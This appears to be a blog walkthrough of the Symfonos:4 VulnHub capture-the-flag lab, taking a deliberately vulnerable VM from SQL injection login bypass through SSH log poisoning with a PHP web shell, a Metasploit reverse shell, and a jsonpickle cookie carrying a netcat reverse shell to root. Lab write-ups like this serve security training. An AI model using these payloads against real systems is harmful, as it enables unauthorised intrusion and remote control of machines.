@@ -1,0 +1,108 @@
+<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
+<div class="post-content">
+            <div class="post-cats">
+                <span class="cat-links"><a href="https://www.hackingarticles.in/category/ctf-challenges/" rel="category tag">CTF Challenges</a>, <a href="https://www.hackingarticles.in/category/ctf-challenges/vulnhub/" rel="category tag">VulnHub</a></span>            </div>
+            <h1 class="post-title entry-title">Symfonos:4 Vulnhub Walkthrough</h1>            <div class="post-date">
+                                    <div class="entry-meta">
+                        <span class="posted-on"><a href="https://www.hackingarticles.in/symfonos4-vulnhub-walkthrough/" rel="bookmark"><time class="entry-date published" datetime="2019-08-30T05:17:04+00:00">August 30, 2019</time><time class="updated" datetime="2025-06-10T20:11:14+00:00">June 10, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
+                            </div>
+
+            <div class="content post-excerpt entry-content clearfix">
+                <p><span style="color: #000000;">Hello, guys today we are going to take a new challenge Symfonos:4, which is a fourth lab of the series Symfonos. The credit for making this VM machine goes to “Zayotic” and it’s another boot2root challenge where we have to root the server and capture the flag to complete the challenge. You can download this VM <a href="https://www.vulnhub.com/entry/symfonos-4,347/">here</a>.</span></p>
+<p><span style="color: #000000;"><strong>Level</strong>: Intermediate</span></p>
+<h3><span style="color: #800000;"><strong>Penetrating Methodology:</strong></span></h3>
+<p><span style="color: #000000;"><strong>Network Scanning</strong></span></p>
+<ul>
+<li><span style="color: #000000;">Netdiscover</span></li>
+<li><span style="color: #000000;">Nmap</span></li>
+</ul>
+<p><span style="color: #000000;"><strong>Enumeration</strong></span></p>
+<ul>
+<li><span style="color: #000000;">Browsing HTTP Service</span></li>
+<li><span style="color: #000000;">Directory Bruteforcing using dirb</span></li>
+</ul>
+<p><span style="color: #000000;"><strong>Exploitation</strong></span></p>
+<ul>
+<li><span style="color: #000000;">SQL injection to bypass Login Form</span></li>
+<li><span style="color: #000000;">Using LFI to read the Logs</span></li>
+<li><span style="color: #000000;">Using SSH log poisoning using PHP malicious script</span></li>
+<li><span style="color: #000000;">Using Metasploit to create PHP reverse shell</span></li>
+<li><span style="color: #000000;">Port Forwarding</span></li>
+<li><span style="color: #000000;">Encoding and Decoding Cookies</span></li>
+</ul>
+<p><span style="color: #000000;"><strong>Privilege Escalation</strong></span></p>
+<ul>
+<li><span style="color: #000000;">Inject netcat reverse shell into Json Pickle string</span></li>
+<li><span style="color: #000000;">Replacing cookie with Base64 Encoded Reverse Shell</span></li>
+<li><span style="color: #000000;">Getting Root Access</span></li>
+</ul>
+<h3><span style="color: #000000;"><u>Walkthrough</u></span></h3>
+<h3><span style="color: #800000;"><strong>Network Scanning</strong></span></h3>
+<p><span style="color: #000000;">We will be running this lab in a Virtual Machine Player or Virtual Box.  But first, let’s discover the IP Address of the lab. i.e <strong>192.168.0.23</strong></span></p>
+<pre class="lang:default decode:true">netdiscover</pre>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-DzoA2J09YTE/XWirXgk1ofI/AAAAAAAAgVI/zJU63pDdFeE8oIxhwIFA9ITEgo7fFnlggCLcBGAs/s1600/1.png"/></p>
+<p><span style="color: #000000;">Once the IP Address is acquired. Now we will run an aggressive scan using nmap for proceed further.</span></p>
+<pre class="lang:default decode:true">nmap -A 192.168.0.23</pre>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-endLDQt1Kqo/XWirblWZKFI/AAAAAAAAgV4/KaqSjK9M6RoVyMpN5w2HoKhHrTBo74zaACLcBGAs/s1600/2.png"/></p>
+<h3><span style="color: #800000;"><strong>Enumeration</strong></span></h3>
+<p><span style="color: #000000;">For more details, we will need to start enumeration against the host machine. Therefore, we will navigate to a web browser for exploring HTTP service since port 80 is open.</span></p>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-BRN_0gbBhmw/XWircniDeUI/AAAAAAAAgWA/8ZCZCwZGRa8SLT22HnspEFdlicNUlmPXACLcBGAs/s1600/3.png"/></p>
+<p><span style="color: #000000;">Let’s further enumerate the target machine through a directory Bruteforce. For this, we are going to use the dirb tool. This gave us a page named “atlantis.php” and “sea.php”. After browsing both directories we noticed “sea.php” was redirecting to “atlantis.php”.</span></p>
+<pre class="lang:default decode:true">dirb http://192.168.0.23/ /usr/share/wordlists/dirb/big.txt -X .php</pre>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-ZPqcwqaW5AQ/XWirc23dHoI/AAAAAAAAgWE/hQ4iln-r-DULsPRN6L4_jHaWKKyTG315QCLcBGAs/s1600/4.png"/></p>
+<h3><span style="color: #800000;"><strong>Exploitation</strong></span></h3>
+<p><span style="color: #000000;">So, browsing Atlantis.php directory came out to be a <strong>Login Form</strong>. To further enumerate the form, we tried combinations of SQL Injection. After a few tries, we were able to bypass the Login form using <strong>‘or ‘1’=’1’</strong> as a username. And for the password, we gave any random value.</span></p>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-ieexVpD_BZA/XWirczHN_MI/AAAAAAAAgWI/aEPlHt0-T04c8D_keOK9xBZtgsvrfnV5ACLcBGAs/s1600/5.png"/></p>
+<p><span style="color: #000000;">We got a prompt to select a god after successfully bypassing the Login form. We selected any random god i.e Hades and were redirected to a URL which left us inquisitive.</span></p>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-csLHrZ9gK_w/XWirdbiAIGI/AAAAAAAAgWM/zi--eZ5Iz1k4mub0fzTokLHz8pv-6TPCgCLcBGAs/s1600/6.png"/></p>
+<p><span style="color: #000000;">After seeing all the possibilities, it quickly strikes let’s try Local File Inclusion. After trying to find /etc/passwd file but didn’t succeed, after we thought of reading the log file using LFI. And we successfully did read the logs.</span></p>
+<p><span style="color: #000000;"><strong>For Reference: </strong><a style="color: #000000;" href="https://www.hackingarticles.in/rce-with-lfi-and-ssh-log-poisoning/"><strong>https://www.hackingarticles.in/rce-with-lfi-and-ssh-log-poisoning/</strong></a></span></p>
+<p><span style="color: #000000;">So we try to inject malicious PHP command via SSH for poisoning auth logs as shown in the image below so that hopefully we can use a ‘C’ parameter to run arbitrary systems commands on the Target Machine.</span></p>
+<pre class="lang:default decode:true">ssh '&lt;?php system($_GET['c']); ?&gt;'@192.168.0.23</pre>
+<p><img decoding="async" src="https://1.bp.blogspot.com/--ECmLmYN71o/XWireJC_-CI/AAAAAAAAgWU/jw-SpMBRjjorSW4imNZL8maySOoJWxAlwCLcBGAs/s1600/7.png"/></p>
+<p><span style="color: #000000;">Indeed we have to way to execute commands on the target machine. To confirm it we simply checked the <strong>id </strong>of the Target machine.</span></p>
+<p><span style="color: #000000;">Time to Fire Up Metasploit, by using Web-Delivery module we have created a malicious link for PHP reverse shell.</span></p>
+<pre class="lang:default decode:true">use exploit/multi/script/web_delivery
+set target 1
+set payload php/meterpreter/reverse_tcp
+set lhost 192.168.025
+exploit</pre>
+<p><img decoding="async" src="https://1.bp.blogspot.com/--xYxE-vkHmo/XWirXvWlwvI/AAAAAAAAgVM/ous0Y8H5eg4qFLrECCq6satZPENk37X2QCLcBGAs/s1600/11.png"/></p>
+<p><span style="color: #000000;">We need to run the above PHP reverse shell in the ‘C’ parameter in the URL as shown in the image.</span></p>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-Lg7acur3Z-M/XWirXldJudI/AAAAAAAAgVQ/yUmfF4b2Ons7DANMoUqTakkwObyMUnOoQCLcBGAs/s1600/12.png"/></p>
+<p><span style="color: #000000;">On successfully executing the Shell, We saw a new session is opened. To get the complete meterpreter we need to interact with the opened session. And to confirm we checked the system information.</span></p>
+<pre class="lang:default decode:true ">sessions 1
+sysinfo</pre>
+<p> </p>
+<p><img decoding="async" src="https://1.bp.blogspot.com/--xYxE-vkHmo/XWirXvWlwvI/AAAAAAAAgVM/ous0Y8H5eg4qFLrECCq6satZPENk37X2QCLcBGAs/s1600/11.png"/></p>
+<p><span style="color: #000000;">We thought of checking the ongoing processes. After looking out, we saw an interesting process which was running on <strong>127.0.0.1:8080</strong> but we didn’t see it in our Nmap result because it was an internal process.</span></p>
+<pre class="lang:default decode:true">ps</pre>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-O1e4JDBrhi8/XWirY13oxPI/AAAAAAAAgVY/o8I5G9dbtLs5CmM2DuCc2yd9nJzcZmqRQCLcBGAs/s1600/14.png"/></p>
+<p><span style="color: #000000;">Let’s forward the port 8080 to our port 8888.</span></p>
+<pre class="lang:default decode:true">portfwd add -l 8888 -p 8080 -r 127.0.0.1</pre>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-DTxTYjPUsQA/XWirZZMTgKI/AAAAAAAAgVc/aOK2yt564m8ujP87A9dad3Rgkilwa_44ACLcBGAs/s1600/15.png"/></p>
+<p><span style="color: #000000;">Once done with port forwarding. We browsed the forwarded port 8888 with Localhost on the browser but where getting redirected to a page /whoami.</span></p>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-fgrf-DwDm30/XWirZ8lp-zI/AAAAAAAAgVg/cqluMM92Lu8_gVD8q-WNiwEq6gFYMM36ACLcBGAs/s1600/16.png"/></p>
+<p><span style="color: #000000;">I guess we need to manually go back to the main page. Then we got a thought that we might have a cookie for the username.</span></p>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-Z_FpHpKsStY/XWirZ9UBqdI/AAAAAAAAgVk/GnHaNKUpiTcnS5A3qtsoYi4FG2LFyjH2QCLcBGAs/s1600/17.png"/></p>
+<p><span style="color: #000000;">Without wasting time lets intercept the request of this page using Burp Suite. So the cookie is <strong>base64 encoded</strong>. We need to decode it.</span></p>
+<p><span style="color: #000000;"><strong>NOTE: Since port 8080 was busy with another process. So we change the listening of Burpsuite to any random port. Don’t forget to configure it before intercepting the request</strong>.</span></p>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-mr4cP_f8soE/XWiraOh1UxI/AAAAAAAAgVo/zF4p_q248IAU2PmGB9iOEgmVxYOBtWNJwCLcBGAs/s1600/18.png"/></p>
+<p><span style="color: #000000;">We decoded the cookie using Burp Suite inbuilt decoder. After searching about the decoded string, we came to know it is a <strong>jsonpickle string</strong>.</span></p>
+<pre class="lang:default decode:true">{"py/object": "app.User", "username": "Poseidon"}</pre>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-pAmn8w7S_2U/XWira7qgtWI/AAAAAAAAgVs/BWKfdIHhpz4VERG3Ze01MAzII70fFiB0QCLcBGAs/s1600/19.1.png"/></p>
+<p><span style="color: #000000;">Making some modification in the jsonpickle string, we added a netcat reverse shell and encoded the whole string into base64.</span></p>
+<pre class="lang:default decode:true">{"py/object":"__main__.Shell","py/reduce":[{"py/function":"os.system"},["/usr/bin/nc -e /bin/sh 192.168.0.25 5555"], 0, 0, 0]}</pre>
+<p><span style="color: #000000;"><strong> <img decoding="async" src="https://1.bp.blogspot.com/-4iOecscB66g/XWirbBOCaaI/AAAAAAAAgVw/D3ImXOBWXdAE22qcoOggVjirL_giaHlWACLcBGAs/s1600/19.png"/></strong></span></p>
+<p><span style="color: #000000;">We need to replace the old cookie with the new base64 encoded string and forward the request in Burp Suite. Also, don’t forget to spawn a netcat listener on port 5555 before forwarding the request on your Kali Terminal.</span></p>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-SnGNMiYtfJs/XWirbnH5VkI/AAAAAAAAgV0/Qc1Zj9sSfQwfhNir56uR9YIxdCCY5IXhwCLcBGAs/s1600/20.png"/></p>
+<h3><span style="color: #800000;"><strong>Privilege Escalation:</strong></span></h3>
+<p><span style="color: #000000;">We successfully got the netcat session with root access. To confirm we have checked the Id of the user.  The only thing left to do is we went inside the ROOT directory and Read our FLAG.</span></p>
+<pre class="lang:default decode:true">nc -lvp 5555
+id
+cd/root
+ls
+cat proof.txt</pre>
+<p><img decoding="async" src="https://1.bp.blogspot.com/-8FfH80CshAk/XWircM7EXPI/AAAAAAAAgV8/_25c8CbidKMOyYE2cwCoeKoXXY5KJzu3gCLcBGAs/s1600/21.png"/></p>
+<p><span style="color: #000000;"><strong>Author:</strong> Ashray Gupta is a Security Researcher and Technical Writer at Hacking Articles. Contributing his 3 years in the field of security as a Penetration Tester and Forensic Computer Analyst. Contact <a style="color: #000000;" href="https://www.linkedin.com/in/ashray-gupta-b77221b6/"><strong>Here</strong></a></span></p>
+<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
